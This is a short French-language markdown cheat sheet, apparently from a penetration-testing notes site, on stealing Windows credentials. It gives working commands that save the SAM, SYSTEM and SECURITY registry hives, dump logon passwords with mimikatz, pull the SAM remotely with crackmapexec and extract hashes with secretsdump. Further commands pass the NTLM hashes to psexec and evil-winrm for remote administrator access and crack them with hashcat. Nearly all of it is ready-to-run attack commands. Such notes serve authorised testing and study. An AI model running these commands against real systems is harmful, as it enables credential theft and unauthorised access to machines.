---
public: true # set to true to make the article publishable
---

## Localement
### Récupération de la SAM
```
reg save hklm\sam sam.save
reg save hklm\system system.save
reg save hklm\security security.save
```

### Mimikatz

```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> c:\tmp\mimikatz_output.txt
```
## A distance 

```
crackmapexec smb $TARGET_IP --local-auth -u $LOCAL_USER -p $LOCAL_PASS --sam
```

## Extraction des Hashs

### SAM
```
secretsdump.py local -sam sam.save -security security.save -system system.save LOCAL
```


## Utilisation des Hash LM:NT
### Accès distant
``` shell 
psexec.py Administrator@$TARGET_IP -hashes xxxxxxxxxxxxxxxxx:xxxxxxxxxxxxxxxxxxxxxxx
# ou
psexec.py Administrator@$TARGET_IP -hashes :xxxxxxxxxxxxxxxxxxxxxxx
# on peut également utiliser wmiexec.py et smbexec.py ou encore evil-winrm
evil-winrm -i $TARGET_IP -u Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```

### Cassage des hashs avec hashcat

```
cat hash.txt
64f12cddaa88057e06a81b54e73b949b
31d6cfe0d16ae931b73c59d7e0c089c0
...

sudo hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```